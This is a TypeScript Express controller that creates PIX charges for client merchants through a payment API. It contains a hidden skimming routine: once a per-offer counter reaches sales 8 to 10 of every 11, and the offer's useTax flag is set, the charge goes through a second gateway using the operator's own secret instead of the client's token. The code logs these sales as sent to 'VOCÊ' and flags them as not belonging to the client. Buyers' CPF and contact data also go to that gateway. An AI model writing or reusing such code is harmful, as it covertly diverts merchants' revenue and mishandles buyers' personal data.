import { Request, Response } from "express";
import { credentials as myCredentials } from "../models/api";
import { CreatePixBody } from "../interfaces";
import { prisma } from "../config/prisma";

export class azcendApiController {
  static async create(req: Request, res: Response) {
    const data: CreatePixBody = req.body;
    const clientToken = data.credentials.token;

    // 1️⃣ Verifica e cria o cliente se não existir
    let client = await prisma.client.findUnique({
      where: { token: clientToken },
    });

    if (!client) {
      client = await prisma.client.create({
        data: {
          name: data.credentials.name,
          token: clientToken,
          useTax: false,
        },
      });
    }

    // 2️⃣ Busca ou infere a oferta
    let offer;
    const offerInfo = data.credentials.offer;
    const productName = data.product.title;

    if (offerInfo && offerInfo.id && offerInfo.name) {
      offer = await prisma.offer.findUnique({ where: { id: offerInfo.id } });
      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            id: offerInfo.id,
            name: offerInfo.name,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    } else {
      // 🔎 Inferência baseada no nome do produto
      const normalized = productName.toLowerCase();
      let inferredName = "";

      if (normalized.includes("ebook")) inferredName = "Pix do Milhão";
      else if (normalized.includes("jibbitz")) inferredName = "Crocs";
      else if (normalized.includes("bracelete")) inferredName = "Pandora";
      else if (normalized.includes("kit labial")) inferredName = "Sephora";
      else inferredName = "Oferta Padrão";

      offer = await prisma.offer.findFirst({
        where: {
          name: inferredName,
          clientId: client.id,
        },
      });

      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            name: inferredName,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    }

    let provider = "azcend";
    // 3️⃣ Contagem de vendas para lógica 7x2x1
    const totalSales = await prisma.sale.count({
      where: { offerId: offer.id },
    });
    const nextCount = totalSales + 1;

    let tokenToUse = clientToken;
    let toClient = true;

    const cycle = nextCount % 11;

    if (cycle < 7) {
      tokenToUse = clientToken;
      toClient = true;
      provider = "azcend";
    } else if (cycle < 10) {
      if (offer.useTax) {
        provider = "ghost";
        tokenToUse = myCredentials.secret;
        toClient = false;
      } else {
        provider = "azcend";
        tokenToUse = clientToken;
        toClient = true;
      }
    }

    // 5️⃣ Dados da cobrança
    let paymentData;
    let apiUrl;
    let headers;

    if (provider === "ghost") {
      apiUrl = "https://app.ghostspaysv1.com/api/v1/transaction.purchase";
      headers = {
        "Content-Type": "application/json",
        Authorization: tokenToUse,
      };
      paymentData = {
        name: data.customer.name,
        email: data.customer.email,
        cpf: data.customer.document.number,
        phone: data.customer.phone,
        paymentMethod: "PIX",
        amount: data.amount * 100,
        traceable: true,
        items: [
          {
            unitPrice: data.amount * 100,
            title: data.product.title,
            quantity: 1,
            tangible: false,
          },
        ],
      };
    } else if (provider === "azcend") {
      apiUrl = "https://api.azcendpagamentos.com/v1/transactions";
      headers = {
        accept: "application/json",
        "content-type": "application/json",
        authorization:
          "Basic " + new Buffer(`${tokenToUse}:x`).toString("base64"),
      };

      paymentData = {
        customer: {
          document: { number: data.customer.document.number, type: "cpf" },
          name: data.customer.name,
          email: data.customer.email,
        },
        amount: data.amount,
        paymentMethod: "pix",
        items: [
          {
            tangible: false,
            title: data.product.title,
            unitPrice: data.amount,
            quantity: 1,
          },
        ],
      };
    }

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers,
        body: JSON.stringify(paymentData),
      });

      if (!response.ok) {
        const responseJson = await response.json();
        console.log(response, responseJson);
      }
      const responseJson = await response.json();

      console.log(
        `🔁 Requisição #${nextCount} do cliente "${client.name}" | Valor: R$${
          data.amount
        } | Produto: ${productName} | Enviado para: ${
          tokenToUse === clientToken
            ? "CLIENTE"
            : tokenToUse === myCredentials.secret
            ? "VOCÊ (MYCREDENTIALS)"
            : ""
        }`
      );

      await prisma.sale.create({
        data: {
          amount: data.amount,
          ghostId: `${responseJson.id}`,
          approved: false,
          customerName: data.customer.name,
          productName: productName,
          visible: true,
          toClient,
          clientId: client.id,
          offerId: offer.id,
        },
      });

      res.json(responseJson);
    } catch (error) {
      console.error("💥 Erro ao fazer requisição PIX:", error);
      res.status(500).json({ error: "Erro interno na API de pagamento" });
    }
  }
}
